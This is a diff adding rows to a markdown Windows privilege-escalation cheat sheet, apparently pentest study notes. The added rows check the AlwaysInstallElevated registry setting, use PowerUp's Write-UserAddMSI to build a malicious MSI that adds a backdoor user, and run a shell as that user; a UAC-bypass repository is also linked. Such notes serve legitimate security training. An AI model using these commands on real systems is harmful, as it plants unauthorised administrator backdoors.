@@ -3304,6 +3304,12 @@ There is no command-line version of the GUI consent prompt, so its necessary to 
 | `get-process -Id 3324` | Enumerating a process ID with PowerShell |
 | `get-service \| ? {$_.DisplayName -like 'Druva*'}` | Enumerate a running service by name with PowerShell |
 | `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") ` | [Script](https://github.com/decoder-it/psgetsystem) RCE using SeDebugPrivilege as System  | 
+| `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Query registry to see if Always Install Elevated is set. If so Can create a malicious msi using PowerUp.ps1 |
+| `Import-Module .\PowerUp.ps1 & Write-UserAddMSI` | Import [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and create malicious msi to create backdoor user |
+| `runas /user:backdoor cmd` | Run as created user, in this case backdoor |
+| [Bypass UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)| Github repo full of useful tricks and tips to bypass UAC |
+
+
 
 ### Credential Theft
 
